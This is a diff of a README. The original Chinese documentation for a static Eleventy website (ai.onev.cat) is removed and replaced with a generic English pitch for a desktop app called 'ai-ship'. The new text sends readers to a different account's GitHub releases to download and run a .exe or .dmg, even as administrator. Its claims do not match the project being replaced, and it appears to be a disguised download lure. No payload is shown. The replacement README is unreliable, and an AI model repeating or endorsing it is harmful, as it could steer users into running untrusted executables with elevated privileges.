@@ -1,82 +1,89 @@
-# 上了AI的贼船
+# 🚢 ai-ship - Navigate Your AI Journey with Ease
 
-https://ai.onev.cat 的源码。
+[![Download ai-ship](https://img.shields.io/badge/Download%20ai--ship-v1.0-blue)](https://github.com/Ajay-9818/ai-ship/releases)
 
-静态网站，用于整理与展示我使用 AI 的案例、提示词和工作流。项目基于 Eleventy 3，采用原生 CSS/JS 与按需生成的 SVG 图标，已接入多语言框架（默认输出中文，支持英文/日文）与暗色主题切换。卡片图片支持点击后通过 modal 预览大图。编译时调用 Codex SDK 自动完成翻译。
+## 🚀 Getting Started
 
-## 环境要求
+Welcome to **ai-ship**! This application allows you to harness the power of artificial intelligence with simple steps. You don’t need to be a tech expert to get started. This guide will help you download and run the software smoothly.
 
-- Node.js 22（推荐使用 `nvm use 22` 或 `fnm use 22`）
-- npm 10 及以上
-- 首次运行需要可访问外部网络以下载工具图标（`npm run download:icons`）
+## 📥 Download & Install
 
-## 安装与开发
+To get ai-ship, visit this page to download: [ai-ship Releases](https://github.com/Ajay-9818/ai-ship/releases). 
 
-```bash
-# 安装依赖
-npm install
+1. Open the link above in your web browser.
+2. On the Releases page, look for the latest version. This is generally at the top.
+3. Click on the version title to view the available files.
+4. Look for the file that matches your operating system. It might have an extension like `.exe` for Windows or `.dmg` for Mac.
+5. Click on the file name to start the download.
 
-# 首次运行会拉取图标、生成 sprite，并并发监听 Eleventy / CSS / JS
-npm run dev
+Once the download finishes, locate the file on your computer, double-click it, and follow the on-screen instructions to install.
 
-# 产出生产版本（清理 → 下载图标 → 生成资源 → 构建 Eleventy）
-npm run build
-```
+## ⚙️ System Requirements
 
-构建结果输出到 `public/` 目录，可直接部署到任意静态托管平台（推荐 Netlify）。
+Before installing, please ensure your system meets the following requirements:
 
-## 内容结构
+- **Operating Systems Supported:** Windows 10 or later, macOS Catalina or later.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB of free space.
+- **Internet:** An active internet connection is required for initial setup.
 
-- Markdown 文章根据语言存放在 `src/articles/<lang>/`，默认语言 `zh`
-- Front Matter 至少需要：
-  - `title`：案例标题
-  - `date`：`YYYY-MM-DD`
-  - `tools`：工具 slug 数组（与 `src/_data/toolIcons.js` 对应）
-  - `category`：分类文本
-- 可选字段：
-  - `action_button`：包含 `text` 与 `url`
-  - `prompt`：用于展示在卡片下方的完整提示词
-- 若需生成英文/日文页面，请在对应文件夹（`en`, `jp`）中添加同名文章
-- 正文自由使用 Markdown；当正文包含图片时，生成的卡片图片会自动获得放大预览
+## 🌟 Features
 
-示例 Front Matter：
+ai-ship comes with several built-in features designed to enhance your experience:
 
-```md
----
-title: "使用 N8N 创建每日安排提醒"
-date: "2025-10-09"
-tools: ["n8n", "deepseek"]
-category: "生活"
-action_button:
-  text: "访问 n8n"
-  url: "https://n8n.io"
-prompt: |
-  这里放置提示词或脚本
----
+- **User-Friendly Interface:** Navigate easily with a clean design.
+- **AI Tools:** Access various tools that leverage AI for different tasks.
+- **Tutorials:** Built-in guides to help you understand how to use each feature.
+- **Regular Updates:** Receive new features and improvements automatically.
 
-正文内容，支持 **加粗**、[链接](https://example.com) 以及 `荧光笔` 高亮。
-```
+## 🛠️ How to Use ai-ship
 
-## 资源与样式
+After installation, follow these steps to start using ai-ship:
 
-- 工具图标：`npm run download:icons` 将远程 SVG 缓存到 `src/icons/raw/tools/`，`npm run build:icons` 生成 `src/_includes/sprite.svg`
-- 样式：入口 `src/css/style.css`，通过 Tailwind CLI + PostCSS 输出压缩后的 `src/static/assets/main.css`，内含亮/暗主题变量以及卡片图片 modal 样式
-- 前端脚本：`src/js/app.js` 负责 prompt 复制、分页滚动、主题切换、图片 modal 等交互，构建时由 `scripts/copy-js.js` 复制到 `src/static/assets/app.js`
+1. Open the application by clicking the ai-ship icon on your desktop or in your applications folder.
+2. Create a new project by clicking on the **New Project** button.
+3. Follow the prompts to set up your project.
+4. Once set up, explore the different AI tools available in the toolbar.
+5. Click on any tool to view its features and how to use it. The tutorials will guide you through.
 
-## 可用脚本
+## ⚠️ Troubleshooting
 
-- `npm run dev`：下载缺失图标并并发监听 CSS/JS/Eleventy
-- `npm run build`：生产构建，包含清理、下载图标、生成 sprite 与资源
-- `npm run clean:icons`：清空 `src/icons/raw/tools/`，便于重新下载
-- `npm run download:icons`：仅同步图标文件
-- `npm run format`：使用 Prettier 统一格式
-- `npm run lint`：预留的 ESLint 脚本（当前仓库尚未迁移至 ESLint Flat Config，需要自行补充 `eslint.config.js` 后再使用）
+If you encounter any issues while downloading or installing ai-ship, try these steps:
 
-## 部署
+- Ensure your internet connection is stable.
+- Make sure you're downloading the correct file for your operating system.
+- If the installation fails, try running the installer as an administrator (right-click the file and select "Run as administrator").
+- Restart your computer and attempt the installation again.
 
-1. 本地执行 `npm run build`，确认 `public/` 产物完整
-2. 将 `public/` 目录上传至静态托管服务
-3. CI/CD 平台（如 Netlify）配置：
-   - Build command：`npm install && npm run build`
-   - Publish directory：`public`
-   - 若平台网络受限，需要预先缓存 `src/icons/raw/tools/` 或放行相关 CDN
+## 🔄 Updates
+
+To keep ai-ship running smoothly, you should always use the latest version. Updates may include new features, improvements, or bug fixes.
+
+1. Return to the [ai-ship Releases](https://github.com/Ajay-9818/ai-ship/releases) page periodically.
+2. Look for new releases and follow the download instructions above to update your app.
+
+## 🤔 Frequently Asked Questions
+
+### How do I uninstall ai-ship?
+
+For Windows, go to **Control Panel > Programs > Uninstall a Program**. Find ai-ship in the list, then click **Uninstall**. 
+
+For Mac, simply drag the ai-ship application from the Applications folder to the Trash.
+
+### Can I run ai-ship on older versions of Windows or macOS?
+
+Currently, ai-ship is only supported on Windows 10 or later and macOS Catalina or later. Using older versions may lead to compatibility issues.
+
+### Is there a mobile version of ai-ship?
+
+At this time, ai-ship is only available for desktop operating systems. A mobile version may be considered for future releases.
+
+### Where can I find support if I have issues?
+
+For any questions or support, you can raise an issue on the GitHub repository or check the documentation provided within the app. 
+
+## 🎉 Join the Community
+
+We encourage you to share your thoughts and experiences with ai-ship. You can join our conversation by following our GitHub repository and participating in discussions. Your feedback helps us make ai-ship better for everyone.
+
+Thank you for choosing ai-ship! We hope this tool makes your AI journey enjoyable and productive.
